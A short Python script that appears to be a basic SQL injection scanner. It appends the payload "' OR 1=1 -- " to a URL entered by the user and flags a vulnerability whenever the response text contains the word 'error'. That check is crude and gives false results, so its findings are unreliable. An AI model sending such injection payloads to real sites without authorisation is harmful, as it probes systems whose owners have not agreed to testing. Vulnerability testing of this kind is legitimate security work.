import requests

def detect_sql_injection(url, payload):
    """
    This function sends a GET request to the specified URL with the specified payload
    and checks the response for signs of an SQL injection vulnerability.
    """
    try:
        response = requests.get(url + payload)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return

    # Check for an error message in the response
    if "error" in response.text.lower():
        print("Possible SQL injection vulnerability detected!")
    else:
        print("No SQL injection vulnerability detected.")

# Test the function with a known vulnerable URL
url = input("Enter the URL to test: ")
payload = "' OR 1=1 -- "
detect_sql_injection(url, payload)
